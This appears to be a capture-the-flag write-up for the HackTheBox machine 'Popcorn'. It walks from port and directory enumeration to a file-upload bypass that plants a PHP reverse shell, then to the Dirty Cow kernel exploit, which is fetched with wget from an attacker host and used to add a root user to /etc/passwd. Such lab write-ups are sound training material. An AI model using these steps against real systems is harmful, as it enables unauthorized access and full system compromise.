# Popcorn - HackTheBox

IP : 10.10.10.6

## Enumeration

### Nmap

```
nmap -T4 -sC -sV 10.10.10.6

22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

There are two open ports :

- TCP/22 : SSH
- TCP/80 : HTTP

Let's start by enumerating port 80.

### HTTP / Port 80

After visiting the website, we have a default page with nothing interesting.

Let's enumerate more with Gobuster.

#### Gobuster

```
gobuster dir -u http://10.10.10.6 -w /usr/share/wordlists/dirbuster/ -t 50

/test (Status: 200)
/index (Status: 200)
/torrent (Status: 301)
/rename (Status: 301)
```

We find a `torrent` directory. Under this directory we find a `TorrentHoster`.

#### File Upload

We have an `upload` tab but we must be logged in. We can register.

Once logged, we can upload only torrent files.

We therefore upload a small torrent file that we find in our torrents.

We see that we can add a screenshot to our torrent, so let's upload a `php reverse-shell` with `PNG` double extension.

```
cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php php-reverse-shell.php.png
```

Without forgetting to modify the IP and the local port.

We start Burpsuite to intercept the request and we modify the file name with just `php-reverse-shell.php`.

Start a netcat listener on the specified port and click on the screenshot we uploaded.

We've got a connection back and a shell as `www-data`

We can get the user flag in `/home/george/user.txt`

## Privilege Escalation

### Kernel Exploit Dirty Cow

The first thing to do when we have a shell is to check the versions.

Wee see the Kernel version is old :

```
uname -a

Linux popcorn 2.6.31-14-generic-pae
```

Let's check if some exploit exist for this Kernel version.

We find on `exploit-db` this exploit for Kernel versions between 2.6.22 and 3.9 : https://www.exploit-db.com/exploits/40839

We must have `gcc` on the target machine, and it's installed ! Perfect !

We copied it in our directory :

```
searchsploit -m 40839.c
```

And we upload it on the remote machine :

On the attacker machine :

```
sudo python3 -m http.server 80
```

On Popcorn :

```
cd /tmp
wget http://<AttackerIP>/40839.c
```

We can now compile it with the instructions in comments of the exploit :

```
gcc -pthread 40839.c -o dirty -lcrypt
```

Run it :

```
./dirty

/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: password
Complete line:
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash
```

We have now a user in the root group.

We connect to the user created `firefart` and we get the root flag in `/root/root.txt` :

```
su firefart
Password: password

firefart@popcorn:~# id
uid=0(firefart) gid=0(root) groups=0(root)
```
